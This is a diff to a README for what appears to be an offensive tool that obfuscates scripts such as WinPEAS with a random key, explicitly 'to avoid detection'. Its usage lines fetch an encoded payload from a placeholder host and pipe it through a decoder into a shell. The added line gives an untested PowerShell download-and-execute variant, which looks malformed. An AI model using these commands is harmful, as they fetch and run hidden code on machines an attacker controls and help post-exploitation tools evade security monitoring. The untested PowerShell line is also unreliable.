@@ -9,6 +9,8 @@ Fetch the generated password from the `encoded.txt` file (e.g. : `# Key: 3Wr9QKX
 
 Host `encoded.txt` and `decode.sh` and just use the decode usage command (e.g.: `curl http://your_host/encoded.txt | bash decode.sh -p 3Wr9QKXC | sh`)
 
+It should be working with WinPEAS on Windows with `iwr -useb http://your_host/encoded.txt | iwr -useb http://your_host/decode.ps1 | iex -ArgumentList "-Key 3Wr9QKXC"` but I didn't tried it yet.
+
 Each encoding uses a new random key, unique signature every time.
 
 Minimal Bash/Perl decoder to avoid detection.
